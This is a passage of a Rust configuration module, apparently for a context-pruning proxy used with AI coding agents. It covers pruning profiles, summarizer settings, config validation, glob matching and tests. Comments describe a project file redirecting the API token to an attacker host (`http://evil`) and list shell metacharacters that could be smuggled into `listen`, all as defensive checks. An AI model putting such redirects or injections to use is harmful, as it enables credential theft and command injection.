    /// (e.g. 1.5, recommended for strong API engines) keeps a higher-fidelity summary
    /// up to `accept_ratio ×` the model-free size — a clean summary beats elision
    /// markers even at a modest byte premium — bounded by an absolute growth cap.
    /// Keep at 1.0 for weak local models (a poor summary larger than model-free is the
    /// case the strict gate guards against).
    pub accept_ratio: f64,
    // ---- backend-specific sub-configs ----
    /// Local ollama / llama.cpp backend knobs.
    pub local: SummarizerLocalConfig,
    /// Named cloud API providers. Each entry corresponds to one
    /// `[[summarizer.providers]]` TOML table. Entries are referenced by `id`
    /// in `engine` / `fallback`. IDs must be unique; `Config::load` errors on
    /// duplicates or unknown references.
    pub providers: Vec<SummarizerProviderConfig>,
}

impl Default for SummarizerConfig {
    fn default() -> Self {
        Self {
            engine: "model-free".to_owned(),
            fallback: Vec::new(),
            mode: "default".to_owned(),
            trigger_bytes: 204_800,
            // A real CPU summary of a ~10K-token slice takes minutes.
            timeout_secs: 180,
            keep_recent_turns: 6,
            // ~32 KB of new prunable old-content before the next accumulator segment.
            // Smaller, more-frequent segments ("more summaries, less size" — maintainer
            // ask, 2026-06-10): the accumulator APPENDS frozen segments, so each
            // re-summarization busts only the bounded new-delta region, not the whole
            // prefix — so halving this from 64 KB roughly doubles coverage on a long
            // session at a modest, bounded cache cost (free for the local engine).
            resummarize_after_bytes: 32_768,
            // Default TRUE (2026-06-05) — accumulator (append-chain) mode; validated by
            // offline AND real-session replay (981-msg real session: -64.6% vs baseline).
            accumulator: true,
            // 128 (was 64): more frozen-segment headroom before the chain collapses
            // (REPLACE) on a very long session — cache-safe (frozen segments stay
            // cache_read), no extra model calls on normal sessions, and §16E measured
            // that lowering resummarize_after_bytes is NOT the right lever (coverage is
            // conserved); raising this cap is. Each segment is a tiny (~1 KB) pair.
            max_summary_segments: 128,
            slice_char_budget: None, // per-engine default (small for local, large for API-only)
            accept_ratio: 1.0,       // strict gate by default (summary must beat model-free)
            local: SummarizerLocalConfig::default(),
            providers: Vec::new(),
        }
    }
}
/// The shipped default profile.
pub const DEFAULT_PROFILE: &str = "default";
/// The recognised profile names.
pub const PROFILES: &[&str] = &["default", "gentle"];

/// Built-in pruning profile → a full `Config` seed. A profile only sets the
/// strategy knobs (and the `profile` field); `server`/`ledger` stay at their
/// defaults. The user's own config keys merge on top, so any single knob can
/// still be overridden. This is the **single source of truth** for the presets
/// — the install template and the benchmark both derive from it.
///
/// - `"default"` — aggressive (the shipped default), cleanest context:
///   all eight cache-safe strategies with tight knobs (incl. `stale_input_cap`
///   and `stale_reads`). `sliding_window` denylists throwaway
///   verb-class tools (`*screenshot*`, `*navigate*`, `*click*`, `*browser_act*`, `Grep`)
///   so reference-data MCP results (e.g. DB queries) are preserved while
///   browser-automation noise is pruned.
/// - `"gentle"` — lightest touch (least pruning, least rot protection):
///   `cross_turn_dedup` + `failed_input_purge` + conservative `bloat_cap`
///   (high threshold, large keep-recent window) + conservative `thinking_strip`
///   (keep_recent=8) so the session still trims genuinely oversized results and
///   old reasoning; `sliding_window`, `stale_reads`, `stale_input_cap`, and
///   `image_strip` are off.
///
/// An unrecognised name falls back to `"default"`.
pub fn profile_baseline(name: &str) -> Config {
    let mut c = Config {
        profile: Some(name.to_owned()),
        ..Config::default()
    };
    let s = &mut c.strategies;
    match name {
        "gentle" => {
            s.cross_turn_dedup.enabled = true;
            s.cross_turn_dedup.exempt_tools = vec!["Task".to_owned(), "Agent".to_owned()]; // Task+Agent = subagent tools (name drift)
            s.failed_input_purge.enabled = true;
            // Conservative bloat_cap: still trims truly bloated results (>32 KB)
            // but leaves normal tool output alone. Keep recent 6 turns for safety.
            // (32KB stays — lowering to 8KB was measured as a minor gain with a real
            // false-trim risk on 8-32KB results; rejected for the conservative profile.)
            s.bloat_cap.enabled = true;
            s.bloat_cap.threshold_bytes = 32_768;
            s.bloat_cap.keep_recent_turns = 6;
            // thinking_strip ON in gentle too (2026-06-05). Without it gentle saved ≈0%
            // on real sessions (real tool output rarely exceeds bloat_cap's 32KB, and
            // exact-dup/error calls are rare). thinking_strip only drops OLD reasoning —
            // never tool_results, inputs, or facts — is cache-stable (reprune replays
            // removals by signature) and API-safe. A CONSERVATIVE keep_recent=8 (vs
            // default's 4) protects more recent reasoning: measured to preserve nearly
            // all long-session savings (5-42%) while sparing short sessions. The
            // aggressive levers (stale_reads, stale_input_cap, sliding_window,
            // image_strip) stay OFF — gentle never touches tool_results, tool inputs,
            // denylisted pairs, or images. That is the gentle/default distinction.
            s.thinking_strip.enabled = true;
            s.thinking_strip.keep_recent_turns = 8;
            c.reprune.enabled = true;
        }
        // "default" and any unknown name → aggressive: all eight cache-safe strategies on.
        _ => {
            s.cross_turn_dedup.enabled = true;
            s.cross_turn_dedup.exempt_tools = vec!["Task".to_owned(), "Agent".to_owned()]; // Task+Agent = subagent tools (name drift)
            s.failed_input_purge.enabled = true;
            s.failed_input_purge.keep_recent_turns = 2;
            s.bloat_cap.enabled = true;
            s.bloat_cap.threshold_bytes = 4_096;
            s.bloat_cap.keep_recent_turns = 2;
            // Reduce OLD successful tool_use inputs (cache-safe content-overwrite;
            // reprune-replayable). Tight window matches the aggressive profile.
            s.stale_input_cap.enabled = true;
            s.stale_input_cap.keep_recent_turns = 2;
            // Elide file Read *results* superseded by a later Write/Edit/re-Read of
            // the same path (cache-safe overwrite). Authored Write/Edit inputs are
            // never collapsed — eliding them corrupted real sessions (§13A).
            // Plus DEMAND-PAGE old large current-view Reads (>16KB, past keep_recent):
            // replaced with a re-read marker; the model self-heals (CC returns fresh).
            s.stale_reads.enabled = true;
            // 16KB chosen for RECOVERABILITY, not savings. An old single-view Read in
            // the 16-32KB band was otherwise bloat_cap-trimmed (head/tail kept, middle
            // SILENTLY dropped) → a buried fact became a confident wrong answer. Routing
            // it through demand-page instead removes ALL content, so the model must
            // re-read (Phase 3C live A/B: Sonnet-low confident-misleading 6/9 → 1/9,
            // recovery 1/9 → 8/9; Haiku 7/15 → 15/15; over-paging negligible; savings
            // unchanged-to-slightly-higher). 8KB is intentionally NOT the default: the
            // 8-16KB band carries the prior "pages normal files the model is actively
            // using → silent competence risk" concern and was not validated here.
            // Bounded by keep_recent (recent reads never paged) and the §13B
            // repeated-read guard (a path Read >1× is never paged → no read-spiral).
            s.stale_reads.page_min_bytes = 16_384;
            s.stale_reads.keep_recent_turns = 4;
            // thinking_strip is now cache-stable (reprune replays removals; live
            // run confirmed 92% cache-hit), API-safe, and the biggest single mass
            // on reasoning-heavy sessions — enable it in the aggressive default.
            s.thinking_strip.enabled = true;
            s.sliding_window.enabled = true;
            s.sliding_window.keep_recent_turns = 2;
            // Verb-based denylist: prunes throwaway browser-automation noise
            // without nuking reference-data MCP results (the mcp__* blanket drops
            // things like DB query results the agent still needs — see needle.rs).
            s.sliding_window.denylist_tools = vec![
                "*screenshot*".to_owned(),
                "*navigate*".to_owned(),
                "*click*".to_owned(),
                // `*browser_act*`, NOT `*act*`: a bare `*act*` substring also matches
                // reference-data tools like `…extract`, `…interact`, `…redact`,
                // `…transact` — silently sliding out results the agent still needs,
                // the exact failure the comment above warns against. Scope it to the
                // browser `act` verb.
                "*browser_act*".to_owned(),
                "Grep".to_owned(),
            ];
            s.image_strip.enabled = true;
            s.image_strip.keep_recent_count = 1;
            c.reprune.enabled = true;
            // Byte-based re-checkpoint: force a re-prune once the appended tail
            // carries >128 KB of tool_result content, even within the message
            // threshold — so a short-but-large read-heavy session re-checkpoints
            // and the age-gated bloat_cap trims its old reads (the live-canary
            // short-session 0% gap). 128 KB ≈ TWO large file reads: high enough that
            // a single big read can't self-trigger a re-checkpoint every turn (which
            // would defeat reprune's batching), but low enough that a genuinely
            // read-heavy session re-checkpoints within a couple of turns. Bounded so
            // ordinary small-result growth keeps batching. Tunable; the live canary
            // measures the cache impact.
            c.reprune.recheckpoint_result_bytes = 131_072;
        }
    }
    c
}

/// Summarizer-pace presets for `summarizer.mode` (parallels `PROFILES`).
pub const SUMMARIZER_MODES: &[&str] = &["default", "gentle"];

/// Seed the summarizer cadence knobs from the `mode` preset. Applied at load time
/// BELOW the user's explicit `[summarizer]` keys, so any knob the user sets still
/// wins. `"default"` leaves the validated baseline (`SummarizerConfig::default`);
/// `"gentle"` summarizes LESS often (engage later, bigger re-summarize delta, protect
/// more recent turns). The model tier stays `qwen3.5:4b` (2b harm-fails) and the
/// accumulator stays on regardless of mode — gentle changes only the CADENCE.
fn apply_summarizer_mode(s: &mut SummarizerConfig, mode: &str) {
    s.mode = mode.to_owned();
    if mode == "gentle" {
        s.trigger_bytes = 409_600; // 400 KB — engage later (default 200 KB)
        s.resummarize_after_bytes = 131_072; // 128 KB — re-summarize far less often (default 32 KB)
        s.keep_recent_turns = 8; // protect more recent turns (default 6)
    }
}

impl Config {
    /// Load config by merging the profile baseline < global file < project file
    /// < `TRIMWIRE_*` env vars. Missing files are treated as empty (no error).
    ///
    /// Security exception: `server.upstream` is **never** taken from the
    /// project-local `./.trimwire.toml`. That key decides where the
    /// `Authorization: Bearer` token is sent, so honoring it from a checked-out
    /// repo would let a cloned project redirect your API token (e.g.
    /// `upstream = "http://evil"`). It comes only from defaults, the global
    /// config, or `TRIMWIRE_*` env. Project files may still tune `listen` and
    /// strategies.
    pub fn load() -> Result<Self> {
        // Pass 1: resolve the profile name from the full chain (a project file
        // or env may select it — harmless, since it only seeds strategy knobs,
        // not `upstream`). Unknown names fall back to the default with a warning.
        let probe = Figment::from(Serialized::defaults(Config::default()))
            .merge(Toml::file(global_config_path()))
            .merge(Toml::file(".trimwire.toml"))
            .merge(Env::prefixed("TRIMWIRE_").split("__"));
        let profile = probe
            .extract_inner::<Option<String>>("profile")
            .ok()
            .flatten()
            .unwrap_or_else(|| DEFAULT_PROFILE.to_owned());
        let profile = if PROFILES.contains(&profile.as_str()) {
            profile
        } else {
            eprintln!("[trimwire] unknown profile {profile:?}; using {DEFAULT_PROFILE}");
            DEFAULT_PROFILE.to_owned()
        };
        // Resolve the summarizer mode the same way (default|gentle).
        let mode = probe
            .extract_inner::<String>("summarizer.mode")
            .unwrap_or_else(|_| "default".to_owned());
        let mode = if SUMMARIZER_MODES.contains(&mode.as_str()) {
            mode
        } else {
            eprintln!("[trimwire] unknown summarizer.mode {mode:?}; using default");
            "default".to_owned()
        };

        // Pass 2: seed the profile baseline (+ summarizer mode preset) below the
        // user's explicit keys, so any single knob the user sets still overrides.
        let mut baseline = profile_baseline(&profile);
        apply_summarizer_mode(&mut baseline.summarizer, &mode);
        let trusted = Figment::from(Serialized::defaults(baseline))
            .merge(Toml::file(global_config_path()))
            .merge(Env::prefixed("TRIMWIRE_").split("__"));
        let mut cfg: Config = trusted
            .clone()
            .merge(Toml::file(".trimwire.toml"))
            .extract()?;

        let trusted_upstream: String = trusted
            .extract_inner("server.upstream")
            .unwrap_or_else(|_| Config::default().server.upstream);
        if cfg.server.upstream != trusted_upstream {
            eprintln!(
                "[trimwire] ignoring `upstream` from project ./.trimwire.toml \
                 (credential-routing is global-only); using {trusted_upstream}"
            );
            cfg.server.upstream = trusted_upstream;
        }

        // Summarizer provider endpoints are credential/data-routing surface
        // (base_url/full_url decide WHERE your context slice + API key go), so —
        // exactly like `server.upstream` — they are GLOBAL-ONLY. A project
        // `./.trimwire.toml` must not define `[[summarizer.providers]]`: a cloned
        // repo could otherwise point the (opt-in) summarizer at an attacker URL and
        // exfiltrate the prunable slice. If the project file defines providers, fall
        // back to the trusted (defaults+global+env) set. A project may still select
        // among globally-defined providers via `summarizer.engine`.
        let project_defines_providers = Figment::from(Toml::file(".trimwire.toml"))
            .find_value("summarizer.providers")
            .is_ok();
        if project_defines_providers {
            let trusted_providers: Vec<SummarizerProviderConfig> = trusted
                .extract_inner("summarizer.providers")
                .unwrap_or_default();
            if cfg.summarizer.providers != trusted_providers {
                eprintln!(
                    "[trimwire] ignoring [[summarizer.providers]] from project ./.trimwire.toml \
                     (endpoint/credential routing is global-only); using the global providers"
                );
                cfg.summarizer.providers = trusted_providers;
            }
        }

        // `listen` is interpolated into generated shell-rc exports (unquoted-historically)
        // AND systemd `.socket` / launchd unit files by `install`. A valid host:port only
        // ever contains `[0-9A-Za-z]`, `.`/`:`/`-` and IPv6 brackets `[]` (plus `_` for
        // some hostnames) — so we ALLOWLIST that set and reject anything else. This blocks
        // shell-rc injection from a project `./.trimwire.toml` (e.g. `listen` smuggling
        // `;`, `|`, `$`, backticks, `${IFS}`, or a newline to append extra `export`/unit
        // lines). Whitespace/control chars are excluded by the allowlist too. Fall back to
        // the trusted value (global config / `TRIMWIRE_*` env), then the built-in default.
        // (`/` is intentionally NOT allowed: callers add the `http://` scheme prefix AFTER
        // this validation, so a valid host:port never needs a slash.)
        // The charset allowlist is the shell-injection guard; the SocketAddr parse is
        // the correctness guard. `listen` is a LOCAL bind address parsed as a
        // `std::net::SocketAddr` (IP:port) by every downstream consumer (install /
        // service / run / status). A hostname like `localhost:8765` passes the charset
        // filter but is NOT a valid SocketAddr — without this it would be accepted here,
        // then silently skip the service install and hard-fail `on`/`status`/`run`.
        // Require an IP:port up front and fall back to the trusted/default value.
        let is_unsafe_listen = |s: &str| {
            s.is_empty()
                || s.chars().any(|c| {
                    !(c.is_ascii_alphanumeric() || matches!(c, ':' | '.' | '-' | '[' | ']' | '_'))
                })
                || s.parse::<std::net::SocketAddr>().is_err()
        };
        if is_unsafe_listen(&cfg.server.listen) {
            let trusted_listen: String = trusted
                .extract_inner("server.listen")
                .unwrap_or_else(|_| Config::default().server.listen);
            let safe_listen = if is_unsafe_listen(&trusted_listen) {
                Config::default().server.listen
            } else {
                trusted_listen
            };
            eprintln!(
                "[trimwire] ignoring invalid `listen` — it must be a numeric IP:port \
                 (e.g. 127.0.0.1:8765 or [::1]:8765), not a hostname, and may not contain \
                 shell metacharacters; using {safe_listen}"
            );
            cfg.server.listen = safe_listen;
        }

        // Validate summarizer: duplicate provider IDs and unknown engine/fallback refs.
        {
            let s = &cfg.summarizer;
            // 0. Provider ids must be non-empty and must NOT shadow a reserved engine
            //    token — otherwise `engine = "local"`/`"model-free"` would silently route
            //    to the built-in engine and the named provider would be dead config.
            for p in &s.providers {
                let id = p.id.trim();
                if id.is_empty() {
                    anyhow::bail!(
                        "[trimwire] summarizer: a [[summarizer.providers]] entry has an empty id \
                         — id is required (it's how engine/fallback reference the provider)"
                    );
                }
                if id == "local" || id == "model-free" {
                    anyhow::bail!(
                        "[trimwire] summarizer: provider id {:?} is reserved — \"local\" and \
                         \"model-free\" are built-in engine tokens; pick another id",
                        p.id
                    );
                }
            }
            // 1. Duplicate provider id check.
            let mut seen_ids: std::collections::HashSet<&str> = std::collections::HashSet::new();
            for p in &s.providers {
                if !seen_ids.insert(p.id.as_str()) {
                    anyhow::bail!(
                        "[trimwire] summarizer: duplicate provider id {:?} — \
                         each [[summarizer.providers]] entry must have a unique id",
                        p.id
                    );
                }
            }
            // 2. Unknown engine/fallback reference check.
            let is_known = |tok: &str| -> bool {
                tok == "model-free" || tok == "local" || s.providers.iter().any(|p| p.id == tok)
            };
            if !is_known(&s.engine) {
                anyhow::bail!(
                    "[trimwire] summarizer.engine = {:?} is not a known engine token \
                     (expected \"model-free\", \"local\", or a configured provider id)",
                    s.engine
                );
            }
            for tok in &s.fallback {
                if !is_known(tok) {
                    anyhow::bail!(
                        "[trimwire] summarizer.fallback entry {:?} is not a known engine token \
                         (expected \"model-free\", \"local\", or a configured provider id)",
                        tok
                    );
                }
                // A fallback that duplicates the primary engine is a no-op (run_cascade
                // de-duplicates the chain, so the entry is dropped at runtime). It is not
                // a hard error — the config still loads — but it is almost certainly a
                // misconfiguration, so we warn.
                if tok == &s.engine {
                    eprintln!(
                        "[trimwire] warning: summarizer.fallback entry {:?} is the same as \
                         summarizer.engine — redundant (the cascade de-duplicates the chain, \
                         so this entry is dropped). Consider removing it.",
                        tok
                    );
                }
            }
            // 3. Style validation: only "anthropic" and "openai" are recognized wire styles.
            for p in &s.providers {
                if p.style != "anthropic" && p.style != "openai" {
                    anyhow::bail!(
                        "[trimwire] summarizer: provider {:?} has unknown style {:?} — \
                         valid values are \"anthropic\" or \"openai\"",
                        p.id,
                        p.style
                    );
                }
            }
            // 4. Non-empty base_url (unless full_url is set) and model per provider — a
            //    blank value is always a misconfiguration → a silent skip or malformed URL.
            for p in &s.providers {
                let has_full_url = p.full_url.as_deref().is_some_and(|u| !u.trim().is_empty());
                if p.base_url.trim().is_empty() && !has_full_url {
                    anyhow::bail!(
                        "[trimwire] summarizer: provider {:?} has an empty base_url — \
                         set it to the API root URL (e.g. \"https://api.anthropic.com\"), \
                         or set full_url to the exact endpoint URL",
                        p.id
                    );
                }
                if let Some(u) = p.full_url.as_deref() {
                    if !u.trim().is_empty() && !u.starts_with("http") {
                        anyhow::bail!(
                            "[trimwire] summarizer: provider {:?} full_url = {u:?} must be an \
                             absolute http(s) URL (the exact POST endpoint)",
                            p.id
                        );
                    }
                }
                if p.model.trim().is_empty() {
                    anyhow::bail!(
                        "[trimwire] summarizer: provider {:?} has an empty model — \
                         set it to the model id to use (e.g. \"claude-haiku-4-5\")",
                        p.id
                    );
                }
            }
            // 5. Double-/v1 trap: an openai-style provider whose base_url ends with
            //    "/v1" will produce "/v1/v1/chat/completions" at runtime. Warn clearly
            //    at load time so the user can fix it before any billable call is made.
            for p in &s.providers {
                let has_full_url = p.full_url.as_deref().is_some_and(|u| !u.trim().is_empty());
                if p.style == "openai"
                    && !has_full_url
                    && p.base_url.trim_end_matches('/').ends_with("/v1")
                {
                    eprintln!(
                        "[trimwire] warning: summarizer provider {:?} has base_url = {:?} which \
                         ends with \"/v1\" — this will produce a double-/v1 path at runtime \
                         (/v1/v1/chat/completions). Remove the trailing \"/v1\" from base_url \
                         (e.g. use \"https://openrouter.ai/api\", not \"https://openrouter.ai/api/v1\").",
                        p.id, p.base_url
                    );
                }
            }
            // 6. accept_ratio must be finite and >= 1.0. A NaN/inf/negative/zero value
            //    makes the fidelity gate compute a 0 (or garbage) ceiling and silently
            //    REJECT every summary — disabling compaction with no error. Catch it
            //    at load time (e.g. a bad TOML/env value) instead of failing silently.
            if !s.accept_ratio.is_finite() || s.accept_ratio < 1.0 {
                anyhow::bail!(
                    "[trimwire] summarizer.accept_ratio = {} is invalid — it must be a finite \
                     number >= 1.0 (1.0 = strict 'summary must beat model-free'; higher, e.g. 1.5, \
                     keeps a higher-fidelity summary up to that multiple of the model-free size)",
                    s.accept_ratio
                );
            }
        }

        Ok(cfg)
    }
}

/// `$XDG_CONFIG_HOME/trimwire.toml`, else `$HOME/.config/trimwire.toml`, else a
/// bare relative path (last resort when neither env var is set).
pub fn global_config_path() -> PathBuf {
    if let Ok(xdg) = std::env::var("XDG_CONFIG_HOME") {
        if !xdg.is_empty() {
            return PathBuf::from(xdg).join("trimwire.toml");
        }
    }
    if let Ok(home) = std::env::var("HOME") {
        return PathBuf::from(home).join(".config").join("trimwire.toml");
    }
    PathBuf::from("trimwire.toml")
}

/// Match `name` against a shell-style glob `pattern`. Supports `*` (matches
/// any run of characters, including empty); every other char is literal. A
/// pattern with no `*` is therefore an exact match — which is how the Python
/// reference's plain set-membership denylist behaves.
pub fn glob_match(pattern: &str, name: &str) -> bool {
    let p: Vec<char> = pattern.chars().collect();
    let s: Vec<char> = name.chars().collect();
    let (mut pi, mut si) = (0usize, 0usize);
    // Backtrack point for the most recent `*`.
    let mut star: Option<usize> = None;
    let mut star_match = 0usize;
    while si < s.len() {
        if pi < p.len() && (p[pi] == s[si]) {
            pi += 1;
            si += 1;
        } else if pi < p.len() && p[pi] == '*' {
            star = Some(pi);
            star_match = si;
            pi += 1;
        } else if let Some(sp) = star {
            // Mismatch after a `*`: let the `*` swallow one more char.
            pi = sp + 1;
            star_match += 1;
            si = star_match;
        } else {
            return false;
        }
    }
    // Trailing `*`s in the pattern match the empty suffix.
    while pi < p.len() && p[pi] == '*' {
        pi += 1;
    }
    pi == p.len()
}

/// True if `name` matches any pattern in `patterns`.
pub fn matches_any(patterns: &[String], name: &str) -> bool {
    patterns.iter().any(|p| glob_match(p, name))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn glob_exact_match() {
        assert!(glob_match("Bash", "Bash"));
        assert!(!glob_match("Bash", "Read"));
        assert!(!glob_match("Bash", "Bash2"));
        assert!(!glob_match("Bash", "xBash"));
    }

    #[test]
    fn glob_prefix_suffix_contains() {
        assert!(glob_match(
            "mcp__playwright__*",
            "mcp__playwright__navigate"
        ));
        assert!(glob_match("mcp__playwright__*", "mcp__playwright__"));
        assert!(!glob_match("mcp__playwright__*", "mcp__other__navigate"));
        assert!(glob_match("*screenshot*", "browser_take_screenshot"));
        assert!(glob_match("*screenshot*", "screenshot"));
        assert!(glob_match("*screenshot*", "screenshot_now"));
        assert!(!glob_match("*screenshot*", "screen_shot"));
        assert!(glob_match("*", "anything"));
        assert!(glob_match("*", ""));
    }

    #[test]
    fn glob_multiple_stars() {
        assert!(glob_match("a*b*c", "axxbyyc"));
        assert!(glob_match("a*b*c", "abc"));
        assert!(!glob_match("a*b*c", "abx"));
    }

    #[test]
    fn matches_any_over_list() {
        let patterns = vec!["Bash".to_owned(), "mcp__playwright__*".to_owned()];
        assert!(matches_any(&patterns, "Bash"));
        assert!(matches_any(&patterns, "mcp__playwright__click"));
        assert!(!matches_any(&patterns, "Read"));
        assert!(!matches_any(&[], "anything"));
    }

    #[test]
    fn default_config_has_strategies_off() {
        let c = Config::default();
        assert!(!c.strategies.sliding_window.enabled);
        assert!(!c.strategies.image_strip.enabled);
        assert_eq!(c.strategies.sliding_window.keep_recent_turns, 4);
        assert_eq!(c.server.listen, "127.0.0.1:8765");
        assert!(
            c.strategies
                .sliding_window
                .exempt_tools
                .contains(&"Read".to_owned())
        );
        // Opt-in POC levers must default OFF (zero behaviour change unless set).
        assert_eq!(c.strategies.bloat_cap.catastrophic_bytes, 0);
        assert_eq!(c.strategies.bloat_cap.stub_age_turns, 0);
        assert!(c.strategies.bloat_cap.protected_file_patterns.is_empty());
        assert!(c.strategies.stale_reads.protected_file_patterns.is_empty());
        assert!(!c.strategies.system_shape_normalize.enabled);
    }

    #[test]
    fn profile_baselines_have_expected_knobs() {
        // "default": all eight cache-safe strategies, aggressive knobs (mirrors old "high").
        let default = profile_baseline("default");
        assert!(default.strategies.cross_turn_dedup.enabled);
        assert!(default.strategies.failed_input_purge.enabled);
        assert_eq!(default.strategies.failed_input_purge.keep_recent_turns, 2);
        // Subagent tools (Task + Agent) exempt from failed_input_purge too — a failed
        // subagent call's prompt must not be elided (same drift fix as the other strategies).
        for t in ["Task", "Agent"] {
            assert!(
                default
                    .strategies
                    .failed_input_purge
                    .exempt_tools
                    .contains(&t.to_owned()),
                "default must exempt {t} from failed_input_purge"
            );
        }
        assert!(default.strategies.bloat_cap.enabled);
        assert_eq!(default.strategies.bloat_cap.threshold_bytes, 4_096);
        assert_eq!(default.strategies.bloat_cap.keep_recent_turns, 2);
        assert!(default.strategies.sliding_window.enabled);
        assert_eq!(default.strategies.sliding_window.keep_recent_turns, 2);
        // Verb-based denylist — NOT the blanket mcp__*.
        assert!(
            default
                .strategies
                .sliding_window
                .denylist_tools
                .contains(&"*screenshot*".to_owned()),
            "default must include *screenshot* in denylist"
        );
        assert!(
            default
                .strategies
                .sliding_window
                .denylist_tools
                .contains(&"Grep".to_owned()),
            "default must include Grep in denylist"
        );
        assert!(
            !default
                .strategies
                .sliding_window
                .denylist_tools
                .contains(&"mcp__*".to_owned()),
            "default must NOT use blanket mcp__* (verb-based denylist only)"
        );
        // Regression: no default denylist glob may match reference-data tools whose
        // names merely CONTAIN "act" (extract/interact/redact/transact). A bare
        // `*act*` did — `*browser_act*` must not.
        for tool in [
            "mcp__db__extract",
            "mcp__api__interact",
            "redact_pii",
            "transact",
        ] {
            assert!(
                !default
                    .strategies
                    .sliding_window
                    .denylist_tools
                    .iter()
                    .any(|pat| glob_match(pat, tool)),
                "default denylist must NOT match reference-data tool {tool}"
            );
        }
        assert!(default.strategies.image_strip.enabled);
        assert_eq!(default.strategies.image_strip.keep_recent_count, 1);
        // Cache-safe extra levers: stale_input_cap + stale_reads ON in default.
        assert!(default.strategies.stale_input_cap.enabled);
        assert_eq!(default.strategies.stale_input_cap.keep_recent_turns, 2);
        assert!(default.strategies.stale_reads.enabled);
        // Phase 3C: demand-page threshold lowered 32KB→16KB for recoverability (route
        // old single-view 16-32KB Reads through demand-page, not silent bloat_cap trim).
        // 16384 (not 8192 — the 8-16KB band was not validated and carries the prior
        // competence-risk concern).
        assert_eq!(
            default.strategies.stale_reads.page_min_bytes, 16_384,
            "default stale_reads.page_min_bytes must be 16KB (Phase 3C recoverability); not 32KB, not 8KB"
        );
        assert_eq!(
            default.strategies.stale_reads.keep_recent_turns, 4,
            "default demand-page must keep recent reads protected (keep_recent=4)"
        );
        assert!(default.reprune.enabled);
        // "Read coverage gap" fix: Read is AGE-GATED (exempt only while recent),
        // authoring tools stay exempt at every age, and the byte-based re-checkpoint
        // is on. These are the load-bearing invariants of the fix — pin them.
        assert!(
            default
                .strategies
                .bloat_cap
                .exempt_recent_only_tools
                .contains(&"Read".to_owned()),
            "default must age-gate Read (recent-only exemption)"
        );
        assert!(
            !default
                .strategies
                .bloat_cap
                .exempt_tools
                .contains(&"Read".to_owned()),
            "default must NOT exempt Read at every age (it is age-gated)"
        );
        // `Agent` joins `Task`: both are subagent-launch tool names (the name drifted
        // Task→Agent across CC versions) — subagent results must stay exempt so their
        // findings aren't middle-trimmed (NONREAD-BLOAT-MANUAL-INSPECTION-2026-06-18).
        for t in ["Edit", "Write", "MultiEdit", "Task", "Agent"] {
            assert!(
                default
                    .strategies
                    .bloat_cap
                    .exempt_tools
                    .contains(&t.to_owned()),
                "default must keep {t} exempt at every age (load-bearing)"
            );
        }
        assert_eq!(
            default.reprune.recheckpoint_result_bytes, 131_072,
            "default must enable the byte-based re-checkpoint at 128 KB"
        );
        // Task + Agent (subagent tools) are in cross_turn_dedup.exempt_tools.
        for t in ["Task", "Agent"] {
            assert!(
                default
                    .strategies
                    .cross_turn_dedup
                    .exempt_tools
                    .contains(&t.to_owned()),
                "default must exempt {t} from cross_turn_dedup"
            );
        }
        // sliding_window must exempt all authoring tools incl. NotebookEdit (its
        // input stub `{}` would otherwise wipe an authored cell body — §13A class).
        for t in [
            "Read",
            "Edit",
            "Write",
            "MultiEdit",
            "NotebookEdit",
            "Task",
            "Agent",
        ] {
            assert!(
                default
                    .strategies
                    .sliding_window
                    .exempt_tools
                    .contains(&t.to_owned()),
                "default sliding_window must exempt {t}"
            );
        }
        // image_strip default glob covers snapshot tools (not just screenshots).
        for g in ["*screenshot*", "*snapshot*"] {
            assert!(
                default
                    .strategies
                    .image_strip
                    .applies_to_tools
                    .contains(&g.to_owned()),
                "default image_strip must apply to {g}"
            );
        }

        // "gentle": dedup + purge + conservative bloat_cap + thinking_strip
        // (conservative window); the aggressive levers (window/image/stale_*) stay OFF.
        let gentle = profile_baseline("gentle");
        assert!(gentle.strategies.cross_turn_dedup.enabled);
        assert!(gentle.strategies.failed_input_purge.enabled);
        assert!(gentle.strategies.bloat_cap.enabled);
        assert_eq!(
            gentle.strategies.bloat_cap.threshold_bytes, 32_768,
            "gentle bloat_cap threshold must be conservative (~32 KB)"
        );
        assert_eq!(
            gentle.strategies.bloat_cap.keep_recent_turns, 6,
            "gentle bloat_cap keep_recent must be large (6)"
        );
        // thinking_strip ON in gentle (2026-06-05) with a CONSERVATIVE window — it's the
        // only lever that gave gentle real savings on real sessions; drops only OLD
        // reasoning, cache-stable + API-safe. keep_recent=8 (vs default's 4).
        assert!(
            gentle.strategies.thinking_strip.enabled,
            "gentle must enable thinking_strip (the conservative-but-real savings lever)"
        );
        assert_eq!(
            gentle.strategies.thinking_strip.keep_recent_turns, 8,
            "gentle thinking_strip keep_recent must be conservative (8, vs default 4)"
        );
        assert!(
            !gentle.strategies.sliding_window.enabled,
            "gentle must not enable sliding_window"
        );
        assert!(
            !gentle.strategies.image_strip.enabled,
            "gentle must not enable image_strip"
        );
        assert!(
            !gentle.strategies.stale_input_cap.enabled,
            "gentle must not enable stale_input_cap (gentlest touch)"
        );
        assert!(
            !gentle.strategies.stale_reads.enabled,
            "gentle must not enable stale_reads (gentlest touch)"
        );
        assert!(gentle.reprune.enabled);
        // gentle inherits the age-gate (it doesn't override exempt_tools) but does NOT
        // enable the byte-based re-checkpoint — it stays the conservative profile.
        assert_eq!(
            gentle.reprune.recheckpoint_result_bytes, 0,
            "gentle must NOT enable the byte-based re-checkpoint (conservative)"
        );
        assert!(
            gentle
                .strategies
                .cross_turn_dedup
                .exempt_tools
                .contains(&"Task".to_owned()),
            "gentle must exempt Task from cross_turn_dedup"
        );

        // Unknown name falls back to "default" aggressive knobs.
        let unknown = profile_baseline("nonsense");
        assert!(unknown.strategies.bloat_cap.enabled);
        assert_eq!(
            unknown.strategies.bloat_cap.threshold_bytes, 4_096,
            "unknown falls back to default (aggressive) threshold"
        );
    }

    #[test]
    fn summarizer_mode_gentle_seeds_a_slower_cadence() {
        let base = SummarizerConfig::default();

        // "gentle" mode summarizes less often: later trigger, bigger re-summarize
        // delta, more protected recent turns. Model + accumulator are unchanged
        // (gentle changes CADENCE only — never the fidelity-bearing knobs).
        let mut g = SummarizerConfig::default();
        apply_summarizer_mode(&mut g, "gentle");
        assert_eq!(g.mode, "gentle");
        assert_eq!(g.trigger_bytes, 409_600);
        assert_eq!(g.resummarize_after_bytes, 131_072);
        assert_eq!(g.keep_recent_turns, 8);
        assert!(g.trigger_bytes > base.trigger_bytes);
        assert!(g.resummarize_after_bytes > base.resummarize_after_bytes);
        assert_eq!(
            g.local.model, base.local.model,
            "gentle must not downgrade the model (2b harm-fails)"
        );
